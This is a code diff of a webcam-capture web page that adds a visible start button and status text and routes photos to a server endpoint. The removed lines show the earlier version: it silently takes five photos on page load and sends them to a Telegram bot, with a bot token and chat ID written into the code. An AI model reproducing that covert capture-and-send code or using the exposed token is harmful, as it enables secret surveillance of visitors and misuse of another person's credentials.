@@ -1,33 +1,57 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>Camera</title>
+  <style>
+    #video { max-width: 100%; height: auto; display:none; margin-top:10px; }
+    #status { margin-top:8px; color: #333; }
+    #startLink { display:inline-block; padding:8px 12px; background:#007bff; color:#fff; text-decoration:none; border-radius:4px; }
+    #startLink[aria-disabled="true"] { background:#6c757d; pointer-events:none; opacity:0.8; }
+  </style>
 </head>
 <body>
 
-<video id="video" autoplay playsinline style="display:none;"></video>
+<a id="startLink" href="#">Open Camera & Send Photos</a>
+<div id="status"></div>
+
+<video id="video" autoplay playsinline></video>
 <canvas id="canvas" style="display:none;"></canvas>
 
 <script>
-const BOT_TOKEN = "8311344178:AAGxdEolM9Ex3ZnBwqGhmMW3kXTtfZ9-QzU ";
-const CHAT_ID = "6351568884";
+/*
+  SECURITY:
+  - Do NOT put your bot token in this file. The client-side code is visible to anyone who can reach the page.
+  - This page POSTs images to your private server endpoint (/upload). The server forwards them to Telegram using
+    credentials stored server-side (environment variables).
+*/
 
+const UPLOAD_ENDPOINT = "/upload"; // POST endpoint on your server
 const TOTAL_PHOTOS = 5;
 const INTERVAL_MS = 2000;
 
 let taken = 0;
 
 async function startCamera() {
-  const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-  const video = document.getElementById("video");
-  video.srcObject = stream;
-  setTimeout(() => captureLoop(video, stream), 1000);
+  const status = document.getElementById("status");
+  status.textContent = "Requesting camera access...";
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    const video = document.getElementById("video");
+    video.srcObject = stream;
+    video.style.display = "block";
+    status.textContent = "Camera started — taking photos...";
+    setTimeout(() => captureLoop(video, stream), 1000);
+  } catch (err) {
+    console.error(err);
+    status.textContent = "Error accessing camera: " + (err.message || err);
+  }
 }
 
 function captureLoop(video, stream) {
   if (taken >= TOTAL_PHOTOS) {
     stream.getTracks().forEach(t => t.stop());
+    document.getElementById("status").textContent = "Done — photos sent (or attempted).";
     return;
   }
   takePhoto(video);
@@ -37,23 +61,42 @@ function captureLoop(video, stream) {
 
 function takePhoto(video) {
   const canvas = document.getElementById("canvas");
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
-  canvas.getContext("2d").drawImage(video, 0, 0);
-  canvas.toBlob(blob => sendToTelegram(blob), "image/jpeg");
+  canvas.width = video.videoWidth || 640;
+  canvas.height = video.videoHeight || 480;
+  canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
+  canvas.toBlob(blob => sendToServer(blob), "image/jpeg", 0.9);
 }
 
-function sendToTelegram(photoBlob) {
+async function sendToServer(photoBlob) {
+  const status = document.getElementById("status");
   const formData = new FormData();
-  formData.append("chat_id", CHAT_ID);
-  formData.append("photo", photoBlob);
-  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-    method: "POST",
-    body: formData
-  });
+  formData.append("photo", photoBlob, "photo.jpg");
+
+  try {
+    const res = await fetch(UPLOAD_ENDPOINT, {
+      method: "POST",
+      body: formData
+    });
+    if (!res.ok) {
+      const text = await res.text();
+      console.warn("Server upload failed:", res.status, text);
+      status.textContent = `Upload error: ${res.status}`;
+    } else {
+      status.textContent = `Photo ${taken}/${TOTAL_PHOTOS} uploaded.`;
+    }
+  } catch (err) {
+    console.error("Upload error:", err);
+    status.textContent = "Upload failed: " + (err.message || err);
+  }
 }
 
-startCamera();
+document.getElementById("startLink").addEventListener("click", function (e) {
+  e.preventDefault();
+  const link = e.currentTarget;
+  link.setAttribute("aria-disabled", "true");
+  startCamera();
+  document.getElementById("status").textContent = "Starting...";
+});
 </script>
 
 </body>
